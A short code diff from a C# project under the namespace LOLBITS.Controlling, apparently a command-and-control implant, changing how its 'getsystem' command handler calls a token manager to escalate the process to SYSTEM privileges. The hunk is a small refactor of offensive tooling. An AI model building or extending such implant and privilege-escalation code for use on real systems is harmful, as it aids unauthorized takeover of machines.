@@ -243,7 +243,7 @@ namespace LOLBITS.Controlling
                     case "getsystem":
                         {
                             if (Utils.IsHighIntegrity(_sysCall))
-                                rps = TokenManager.GetSystem() ? "We are System!\n" : "ERR:Process failed! Is this process running with high integrity level?\n";
+                                rps = _tokenManager.GetSystem() ? "We are System!\n" : "ERR:Process failed! Is this process running with high integrity level?\n";
                             else
                                 rps = "ERR:Process failed! Is this process running with high integrity level?\n";
 
